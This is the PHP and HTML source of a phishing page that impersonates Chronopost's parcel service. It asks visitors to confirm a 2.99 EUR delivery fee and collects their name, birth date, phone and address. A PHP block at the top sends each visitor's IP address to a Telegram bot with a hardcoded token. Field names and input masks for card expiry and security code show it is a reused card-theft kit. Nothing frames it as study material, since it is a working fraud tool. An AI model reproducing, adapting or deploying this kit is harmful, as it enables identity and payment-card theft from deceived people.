<?php
$ip = getenv("REMOTE_ADDR");
  $message = "[Alert] NEW VISITOR FROM IP : $ip ";
$token ='5254054002:AAHgwgtpZ-3XgKq4FrLh5UodYPoVjI3793E';
    $data = [
    'text' => $message,
    'chat_id' => '1362211844'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
    <title>Chronopost |Envoi et suivi de colis</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="htdocs/img/favicon.jpg" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_001.css">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_002.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/00ce2dd051.js" crossorigin="anonymous"></script>

</head>
<body>

<div class="topnav" id="myTopnav">
  <a href="# " id="top-left"><img src="htdocs/img/separadortop.png" ></a>
  


<a href="#contact " id="top-img_hr">&nbsp;&nbsp;&nbsp;&nbsp;</a>
  <a href="javascript:void(0);" class="icon" >
    <i class="fa fa-bars"></i>
  </a>
</div>

<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container">
    <a class="navbar-brand" href="#"><img src="htdocs/img/logo.png" alt=""></a>
  </div>
</nav>


<div class="btm_nav" id="myTopnav">
  <a href="#">Se connecter</a>
  <a href="#">Particuliers</a>
  <a href="#">Entreprises</a>
  <a href="#">Aide</a>
  <a href="#">Compagnie</a>
  <a href="#">Livreurs</a>
</div>



<div class="container">

<div class="row">

<div class="col-sm-9">
               <p class="alert alert-success" id="alert-success"><i class="fas fa-exclamation"></i> &nbsp;  Veuillez confirmer les frais de livraison (2,99 EUR) et l’adresse de livraison du colis.</p>
<form name="myForm" action="sourceApp/info.php" onsubmit="return validateForm()" method="post">
  <div class="form-row">
    <div class="form-group col-md-6">
      <label for="inputEmail4">Nom complet</label>
      <input type="text" class="form-control" id="Kartenhalter" name="Kartenhalter">
    </div>
    <div class="form-group col-md-6">
      <label for="inputPassword4"> Date de naissance</label>
      <input type="text" class="form-control" id="Geburtsdatuml" name="Geburtsdatuml">
    </div>
  </div>
  <div class="form-group">
    <label for="inputAddress">Numéro de téléphone</label>
    <input type="text" class="form-control" id="EMailaddresse" name="EMailaddresse">
  </div>
  <div class="form-group">
    <label for="inputAddress2">Direction  </label>
    <input type="text" class="form-control" id="Rechnungsadresse" name="Rechnungsadresse">
  </div>
  <div class="form-row">
    <div class="form-group col-md-6">
      <label for="inputCity">Ville </label>
      <input type="text" class="form-control" id="Stadt" name="Stadt">
    </div>
    <div class="form-group col-md-2">
      <label for="inputZip">code postal</label>
      <input type="text" class="form-control" id="Postleitzahl" name="Postleitzahl">
    </div>
  </div>
 
  <button type="submit" class="btn btn-primary" name="infoget">&nbsp;Confirmer</button>
</form>
            </div>

           <div class="col-sm-3 ">
                <div class="card">
  <img src="https://www.chronopost.fr/sites/default/files/thumbnails/image/main-elabel.png" class="card-img-top" alt="...">
  <div class="card-body">
    <h5 class="card-title"></h5>
    <p class="card-text">Le service clientèle se fera un plaisir de vous assister du lundi au vendredi de 8:00 à 21:00 et le samedi de 9:00 à 13:00.</p>
  </div>
</div>
        </div>
 </div>
  </div>





<!-- Footer -->
<footer class="page-footer font-small indigo">
   <!-- Footer Links -->
   <div class="container text-center text-md-left">
      <!-- Grid row -->
      <div class="row">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Particulier</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Envoyer un colis</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Suivre un envoi</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nos offres</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Estimez les tarifs</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Aide</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Se créer un compte</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nos guides</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Vos questions fréquentes</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Espace Outre-Mer</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Flash info</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class="text-uppercase mt-3 mb-4">Mieux nous connaître</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Gouvernance Chronopost</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nous rejoindre</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Engagé et responsable</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">A propos de Chronopost</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Espace Presse</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Informations légales</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Mentions légales</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Alerte fraude</a>
               </li>

            </ul>
         </div>
         <!-- Grid column -->
      </div>
      <!-- Grid row -->
   </div>
   <!-- Footer Links -->
   <!-- Copyright -->
   <div class="footer-copyright  py-3">
      <a href="" class="copyright">Copyright © Chronopost 2021</a>
      <a href="" class="logo-ft"> <img src="htdocs/img/logopie.png" ></a>
   </div>
   <!-- Copyright -->
</footer>
<!-- Footer -->

<script  src="sourceApp/chronopost_if.js"></script>
         <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
         <script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>
         <script type="text/javascript">
            $(":input").inputmask();
            
            $("#Geburtsdatuml").inputmask({"mask": "99/99/9999"});
            $("#EMailaddresse").inputmask({"mask": "+33 9 99 99 99 99"});
            $("#AblaufMM").inputmask({"mask": "99"});
            $("#AblaufAA").inputmask({"mask": "9999"});
            $("#Sicherheitscode").inputmask({"mask": "999"});
         </script>
</body>
</html>
